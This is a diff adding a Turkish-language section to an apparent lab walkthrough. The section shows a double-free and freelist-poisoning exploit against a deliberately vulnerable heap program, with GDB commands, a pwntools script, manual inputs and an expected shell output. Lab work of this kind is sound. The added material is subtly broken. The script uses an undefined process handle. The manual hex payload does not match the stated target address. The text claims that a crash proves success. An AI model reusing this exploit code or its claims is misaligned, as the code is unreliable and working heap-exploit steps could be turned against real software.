@@ -269,6 +269,91 @@ except:
 log.success("Exploit tamamlandi! Tum adimlar basariyla gerceklestirildi.")
 ```
 
+## Tam Çözüm (GDB ile Adres Bulma)
+
+### 1. GDB ile Adres Bulma
+
+```bash
+# Binary'yi GDB ile aç
+gdb ./compiled/vulnerable_code
+
+# Fonksiyon adreslerini bul
+(gdb) info functions
+(gdb) info functions win
+(gdb) x/gx win
+
+# Global değişken adreslerini bul
+(gdb) info variables
+(gdb) x/gx &gTarget
+(gdb) x/gx &gTarget.fn
+
+# Heap durumunu incele
+(gdb) break my_free
+(gdb) run
+(gdb) x/32gx g_head
+(gdb) continue
+```
+
+### 2. Double-Free Exploit Oluşturma
+
+```python
+from pwn import *
+
+# Adresleri GDB'den al
+target_fn_addr = 0x100008090  # &gTarget.fn
+win_addr = 0x100000580        # win fonksiyonu
+
+def alloc():
+    p.sendline(b"alloc")
+    return p.recvuntil(b"> ")
+
+def free(idx):
+    p.sendline(f"free {idx}".encode())
+    return p.recvuntil(b"> ")
+
+def write(idx, data_hex):
+    p.sendline(f"write {idx} {data_hex}".encode())
+    return p.recvuntil(b"> ")
+
+# Exploit adımları
+alloc()  # chunk 0 (A)
+alloc()  # chunk 1 (B)
+free(0)  # A'yı serbest bırak
+free(0)  # Double free!
+
+# Freelist'i zehirle
+poison_payload = p64(target_fn_addr).hex()
+write(0, poison_payload)
+
+# Heap bozulması ile allocation
+alloc()  # A'yı geri al
+alloc()  # A'yı tekrar al (double-free nedeniyle)
+```
+
+### 3. Manuel Test
+
+```bash
+# Programı çalıştır
+./compiled/vulnerable_code
+
+# Komutları manuel olarak gir
+alloc
+alloc
+free 0
+free 0
+write 0 0908001000000000
+alloc
+alloc
+call
+```
+
+### 4. Beklenen Sonuç
+
+```
+[+] Congratulations! You got a shell!
+[+] This means you successfully exploited the double-free vulnerability!
+```
+
 Bu betiği çalıştırdığınızda, adım adım özel heap yöneticisini manipüle edecek ve heap bozulması (heap corruption) gerçekleştirecektir. Program crash olsa bile, bu başarılı bir sömürü göstergesidir.
 
 **Önemli Notlar:**
